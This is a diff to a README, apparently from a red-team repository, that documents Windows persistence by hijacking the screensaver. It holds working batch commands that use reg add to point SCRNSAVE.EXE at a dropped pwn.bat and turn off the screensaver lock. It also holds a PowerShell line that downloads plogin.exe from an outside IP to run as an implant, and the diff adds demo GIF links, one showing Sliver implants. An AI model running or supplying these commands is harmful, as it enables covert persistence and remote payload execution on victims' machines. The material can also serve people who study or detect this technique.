@@ -45,10 +45,10 @@ Sample basic batch script as below:
 
 ```batch
 @echo off
-reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /d 10
-reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /d 1
-reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /d 0
-reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d C:\Windows\Temp\pwn.bat
+reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /d 10 /f
+reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /d 1 /f
+reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /d 0 /f
+reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d C:\Windows\Temp\pwn.bat /f
 
 echo @echo off > C:\Windows\Temp\pwn.bat
 echo msg %username% You are Pwned! >> C:\Windows\Temp\pwn.bat
@@ -92,6 +92,14 @@ reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d C:\Windows\Temp\plogin.e
 
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.147.6/plogin.exe', 'C:\Windows\Temp\plogin.exe')"
 ```
+
+### ScreensaverHijack with command PWNED
+
+![ScreensaverHijack-with-command-PWNED](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-command-PWNED.gif)
+
+### ScreensaverHijack with sliver implants
+
+![ScreensaverHijack-with-sliver-implants](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-sliver-implants.gif)
 
 We may also use C++ and compile as screensaver register key changer executable using command below:
 
